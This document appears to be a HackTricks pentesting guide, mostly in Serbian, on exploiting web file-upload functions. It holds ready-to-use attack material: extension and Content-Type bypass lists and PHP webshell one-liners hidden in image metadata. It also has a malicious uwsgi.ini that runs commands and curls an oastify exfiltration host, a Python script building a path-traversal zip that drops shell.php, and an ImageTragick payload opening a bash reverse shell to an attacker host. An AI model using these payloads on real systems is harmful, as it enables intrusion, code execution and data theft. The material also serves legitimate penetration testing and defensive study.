# Otpremanje fajlova

{{#include ../../banners/hacktricks-training.md}}

## Opšta metodologija za otpremanje fajlova

Other useful extensions:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Zaobilaženje provere ekstenzija fajlova

1. Ako se primenjuju, proveri prethodne ekstenzije. Takođe testiraj ih koristeći velika slova: _pHp, .pHP5, .PhAr ..._
2. Proveri dodavanje validne ekstenzije pre ekstenzije za izvršavanje (koristi prethodne ekstenzije takođe):
- _file.png.php_
- _file.png.Php5_
3. Pokušaj da dodaš specijalne karaktere na kraj. Možeš koristiti Burp da **bruteforce-uješ** sve ascii i Unicode karaktere. (_Napomena: možeš takođe pokušati da iskoristiš prethodno pomenute ekstenzije_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Pokušaj da zaobiđeš zaštite zavaravanjem parsera ekstenzija na serveru tehnikama kao što su dupliranje ekstenzije ili dodavanje beskorisnih podataka (null bajtova) između ekstenzija. _Možeš takođe koristiti prethodne ekstenzije da pripremiš bolji payload._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Dodaj još jedan sloj ekstenzija na prethodnu proveru:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Pokušaj da staviš exec ekstenziju pre validne ekstenzije i nadaj se da je server pogrešno konfigurisan. (korisno za iskorišćavanje Apache misconfiga gde će sve što sadrži ekstenziju **.php**, ali ne mora nužno da se završava sa .php, izvršiti kod):
- _ex: file.php.png_
7. Korišćenje NTFS alternate data stream (ADS) u Windows-u. U ovom slučaju, nakon zabranjene ekstenzije biće umetnut karakter kolon ":” pre dozvoljene ekstenzije. Kao rezultat, na serveru će biti kreiran **prazan fajl sa zabranjenom ekstenzijom** (npr. "file.asax:.jpg”). Ovaj fajl se kasnije može izmeniti koristeći druge tehnike kao što je korišćenje njegovog short filename-a. Pattern "**::$data**” može takođe biti upotrebljen za kreiranje ne-praznih fajlova. Zato dodavanje tačke nakon ovog pattern-a može pomoći da se zaobiđu dalje restrikcije (npr. "file.asp::$data.”)
8. Pokušaj da prekoračiš ograničenja imena fajla. Validna ekstenzija biva isečena. Maliciozni PHP ostaje. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

### Zaobilaženje Content-Type, magic number, kompresije i promene veličine

- Zaobidji provere Content-Type postavljanjem vrednosti Content-Type header-a na: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Zaobidji proveru magic number tako što ćeš na početak fajla dodati bajtove prave slike (zavesti komandu _file_). Ili ubaci shell u metadata:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` ili možeš direktno ubaciti payload u sliku:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Ako se nad tvoju sliku primenjuje kompresija, na primer korišćenjem standardnih PHP biblioteka kao što je [PHP-GD](https://www.php.net/manual/fr/book.image.php), prethodne tehnike neće biti korisne. Međutim, možeš koristiti PLTE chunk [**tehniku definisanu ovde**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) da ubaciš tekst koji će **preživeti kompresiju**.
- [**Github sa kodom**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Web stranica takođe može menjati dimenzije slike koristeći, na primer, PHP-GD funkcije `imagecopyresized` ili `imagecopyresampled`. Međutim, možeš koristiti IDAT chunk [**tehniku definisanu ovde**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) da ubaciš tekst koji će **preživeti kompresiju**.
- [**Github sa kodom**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Još jedna tehnika da se napravi payload koji **preživi menjanje veličine slike**, koristeći PHP-GD funkciju `thumbnailImage`. Takođe se može koristiti tEXt chunk [**tehnika definisana ovde**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) da ubaciš tekst koji će **preživeti kompresiju**.
- [**Github sa kodom**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Ostali trikovi za proveru

- Pronađi ranjivost koja omogućava preimenovanje već otpremljenog fajla (da promeniš ekstenziju).
- Pronađi Local File Inclusion ranjivost da izvršiš backdoor.
- Moguća otkrivanja informacija:
1. Otpremi više puta (i u isto vreme) isti fajl sa istim imenom
2. Otpremi fajl sa imenom fajla ili foldera koji već postoji
3. Otpremanje fajla sa imenom "." , ".." ili "..." . Na primer, u Apache na Windows-u, ako aplikacija snima otpremljene fajlove u "/www/uploads/" direktorijum, fajl sa imenom "." će kreirati fajl "uploads" u "/www/" direktorijumu.
4. Otpremi fajl koji se teško briše, kao što je "…:.jpg" u NTFS-u. (Windows)
5. Otpremi fajl u Windows-u sa nevažećim karakterima kao što su `|<>*?”` u imenu. (Windows)
6. Otpremi fajl u Windows-u koristeći rezervisana (zabranjena) imena kao CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9.
- Takođe pokušaj da otpremiš izvršni fajl (.exe) ili .html (manje sumnjivo) koji će izvršiti kod kada žrtva slučajno otvori fajl.

### Specijalni trikovi sa ekstenzijama

Ako pokušavaš da otpremiš fajlove na PHP server, pogledaj .htaccess trik za izvršavanje koda: [https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Ako pokušavaš da otpremiš fajlove na ASP server, pogledaj .config trik za izvršavanje koda (../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Fajlovi `.phar` su kao `.jar` za java, ali za php, i mogu se koristiti kao php fajl (izvršavajući ih sa php, ili uključujući ih unutar skripta...)

Ekstenzija `.inc` se ponekad koristi za php fajlove koji služe samo za import fajlova, tako da je moguće da je neko dozvolio izvršavanje ove ekstenzije.

## **Jetty RCE**

Ako možeš da otpremiš XML fajl na Jetty server, možeš dobiti [RCE because **new \*.xml and \*.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Dakle, kao što je prikazano na sledećoj slici, otpremi XML fajl u `$JETTY_BASE/webapps/` i očekuj shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Za detaljno objašnjenje ove ranjivosti pogledaj originalno istraživanje: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) ranjivosti se mogu iskoristiti na uWSGI serverima ako napadač ima mogućnost da modifikuje `.ini` konfiguracioni fajl. uWSGI konfiguracioni fajlovi koriste specifičnu sintaksu da uključe "magic" varijable, placeholdere i operatore. Posebno, '@' operator, korišćen kao `@(filename)`, dizajniran je da uključi sadržaj fajla. Među različitim podržanim scheme-ama u uWSGI, "exec" scheme je posebno moćna, jer omogućava čitanje podataka iz standardnog output-a procesa. Ova funkcionalnost se može iskoristiti u zlonamerne svrhe kao što su Remote Command Execution ili Arbitrary File Write/Read kada se `.ini` konfiguracioni fajl obradi.

Razmotri sledeći primer zlonamernog `uwsgi.ini` fajla, koji pokazuje različite scheme:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Izvršavanje payload-a se dešava tokom parsiranja konfiguracione datoteke. Da bi konfiguracija bila aktivirana i parsirana, uWSGI proces mora biti restartovan (moguće nakon pada ili zbog Denial of Service napada) ili datoteka mora biti podešena da se auto-reload-uje. Funkcija auto-reload, ako je omogućena, ponovo učitava datoteku u zadatim intervalima kada detektuje promene.

Ključno je razumeti labavu prirodu parsiranja konfiguracione datoteke od strane uWSGI-a. Konkretno, diskutovani payload može biti umetnut u binarnu datoteku (kao što je slika ili PDF), što dodatno proširuje opseg potencijalne eksploatacije.

## **wget File Upload/SSRF Trick**

Ponekad možete otkriti da server koristi **`wget`** da **preuzme fajlove** i da možete **navesti** **URL**. U tim slučajevima, kod može proveravati da li je ekstenzija preuzetih fajlova u whitelist-i kako bi se osiguralo da će biti preuzeti samo dozvoljeni fajlovi. Međutim, **ova provera se može zaobići.**\
The **maximum** length of a **filename** in **linux** is **255**, however, **wget** truncate the filenames to **236** characters. You can **download a file called "A"\*232+".php"+".gif"**, this filename will **bypass** the **check** (as in this example **".gif"** is a **valid** extension) but `wget` will **rename** the file to **"A"\*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note that **another option** you may be thinking of to bypass this check is to make the **HTTP server redirect to a different file**, so the initial URL will bypass the check by then wget will download the redirected file with the new name. This **won't work** **unless** wget is being used with the **parameter** `--trust-server-names` because **wget will download the redirected page with the name of the file indicated in the original URL**.

## Alati

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) je moćan alat dizajniran da pomogne Pentesters i Bug Hunters u testiranju file upload mehanizama. On koristi različite bug bounty techniques da pojednostavi proces identifikacije i eksploatacije ranjivosti, obezbeđujući temeljne procene web aplikacija.

### Korupcija upload indeksa pomoću snprintf quirks (istorijski)

Neki legacy upload handler-i koji koriste `snprintf()` ili slične funkcije da izgrade multi-file nizove iz jednog single-file upload-a mogu biti prevareni da falsifikuju `_FILES` strukturu. Zbog nekonzistentnosti i skraćivanja u ponašanju `snprintf()`, pažljivo konstruisan single upload može izgledati kao više indeksiranih fajlova na strani servera, zbunjujući logiku koja pretpostavlja striktan oblik (npr. tretira ga kao multi-file upload i ulazi u nesigurne grane). Iako danas manje rasprostranjen, ovaj “index corruption” pattern povremeno se pojavljuje u CTF-ovima i starijim codebases.

## Od File upload do drugih ranjivosti

- Postavi **filename** na `../../../tmp/lol.png` i pokušaj da ostvariš **path traversal**
- Postavi **filename** na `sleep(10)-- -.jpg` i možda ćeš moći da ostvariš **SQL injection**
- Postavi **filename** na `<svg onload=alert(document.domain)>` da ostvariš **XSS**
- Postavi **filename** na `; sleep 10;` da testiraš command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Probaj **different svg payloads** sa [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Ako možeš naložiti web server da učita image sa URL-a, možeš pokušati da zloupotrebiš [SSRF](../ssrf-server-side-request-forgery/index.html). Ako će ta **image** biti **saved** na nekom **public** sajtu, takođe možeš navesti URL sa [https://iplogger.org/invisible/](https://iplogger.org/invisible/) i **ukrasti informacije svakog posetioca**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Specijalno crafted PDFs za XSS: sledeća stranica prikazuje kako da **inject PDF data to obtain JS execution** (pogledaj [following page](../xss-cross-site-scripting/pdf-injection.md)). Ako možeš upload-ovati PDFs, možeš pripremiti PDF koji će izvršiti proizvoljan JS prateći date instrukcije.
- Upload-uj sadržaj \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) da proveriš da li server koristi neki **antivirus**
- Proveri da li postoji neki **size limit** pri uploadovanju fajlova

Evo top 10 liste stvari koje možeš postići upload-ovanjem (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magični početni bajtovi

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Pogledaj [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) za druge tipove fajlova.

## Zip/Tar fajl koji se automatski dekompresuje pri Upload-u

Ako možeš upload-ovati ZIP koji će biti dekompresovan na serveru, možeš uraditi 2 stvari:

### Symlink

Upload-uj arhivu koja sadrži soft links ka drugim fajlovima; pri pristupu dekompresovanim fajlovima, pristupićeš linked files:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Dekompresija u različite foldere

Neočekivano kreiranje fajlova u direktorijumima tokom dekompresije predstavlja značajan problem. I pored početnih pretpostavki da ovo podešavanje može da štiti od OS-level command execution kroz malicious file uploads, podrška za hijerarhijsko kompresovanje i mogućnosti directory traversal formata ZIP arhiva mogu se iskoristiti. To omogućava napadačima da zaobiđu ograničenja i pobegnu iz sigurnih upload direktorijuma manipulisanjem funkcionalnošću dekompresije ciljne aplikacije.

An automated exploit to craft such files is available at [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). The utility can be used as shown:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Dodatno, **symlink trick with evilarc** je opcija. Ako je cilj da se pristupi fajlu poput `/flag.txt`, trebalo bi kreirati symlink ka tom fajlu u vašem sistemu. To obezbeđuje da evilarc ne naiđe na greške tokom svog rada.

Ispod je primer Python koda koji se koristi za kreiranje malicioznog zip fajla:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Zloupotreba kompresije za file spraying**

For further details **check the original post in**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Kreiranje PHP Shell-a**: PHP kod koji izvršava komande prosleđene putem promenljive `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Kreira se više fajlova i sastavlja zip arhiva koja sadrži te fajlove.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: Imena fajlova unutar zip-a se menjaju koristeći vi ili hex editor, menjajući "xxA" u "../" kako bi se izvršilo prelaženje kroz direktorijume.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

Upload this content with an image extension to exploit the vulnerability **(ImageMagick , 7.0.1-1)** (from the [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Embedding PHP Shell on PNG

Umetanje PHP shell-a u IDAT chunk PNG fajla može efikasno zaobići određene operacije obrade slike. Funkcije `imagecopyresized` i `imagecopyresampled` iz PHP-GD posebno su relevantne u ovom kontekstu, pošto se često koriste za promenu veličine i ponovno uzorkovanje slika. Sposobnost ugrađenog PHP shell-a da ostane nepromenjen pri ovim operacijama predstavlja značajnu prednost za određene slučajeve upotrebe.

Detaljna analiza ove tehnike, uključujući metodologiju i potencijalne primene, dostupna je u sledećem članku: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Ovaj resurs pruža sveobuhvatno razumevanje procesa i njegovih implikacija.

Više informacija: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Files

Polyglot files predstavljaju jedinstven alat u sajber bezbednosti, ponašajući se kao kameleon koji može validno postojati u više formata fajlova istovremeno. Zanimljiv primer je [GIFAR](https://en.wikipedia.org/wiki/Gifar), hibrid koji funkcioniše i kao GIF i kao RAR arhiva. Takvi fajlovi nisu ograničeni na ovu kombinaciju; moguće su i kombinacije poput GIF i JS ili PPT i JS.

Suštinska korisnost polyglot fajlova leži u njihovoj sposobnosti da zaobiđu bezbednosne mere koje filtriraju fajlove po tipu. Uobičajena praksa u različitim aplikacijama je dozvoliti samo određene tipove fajlova za upload—kao što su JPEG, GIF ili DOC—kako bi se smanjio rizik od potencijalno opasnih formata (npr. JS, PHP ili Phar fajlovi). Međutim, polyglot, usklađujući se sa strukturnim kriterijumima više formata fajlova, može prikriveno zaobići ta ograničenja.

Uprkos svojoj prilagodljivosti, polygloti imaju ograničenja. Na primer, dok polyglot može istovremeno predstavljati PHAR fajl (PHp ARchive) i JPEG, uspeh njegovog upload-a može zavisiti od politike platforme u vezi ekstenzija fajlova. Ako sistem strogo zahteva dozvoljene ekstenzije, sama strukturna dvostrukost polyglota možda neće biti dovoljna da garantuje upload.

Više informacija: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Upload valid JSONs like if it was PDF

Kako izbeći detekciju tipa fajla tako što ćete upload-ovati validan JSON fajl čak i kada nije dozvoljen, tako što ćete ga predstaviti kao PDF (tehnike iz **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Dokle god su `%PDF` magični bajtovi u prvih 1024 bajta, smatra se validnim (pogledajte primer u postu)
- **`pdflib` library**: Dodajte lažni PDF format unutar polja JSON-a tako da biblioteka misli da je u pitanju pdf (pogledajte primer u postu)
- **`file` binary**: Može pročitati do 1048576 bajta iz fajla. Jednostavno kreirajte JSON veći od toga tako da ne može parsirati sadržaj kao JSON, a zatim unutra u JSON ubacite početni deo pravog PDF-a i on će misliti da je u pitanju PDF

## References

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#include ../../banners/hacktricks-training.md}}
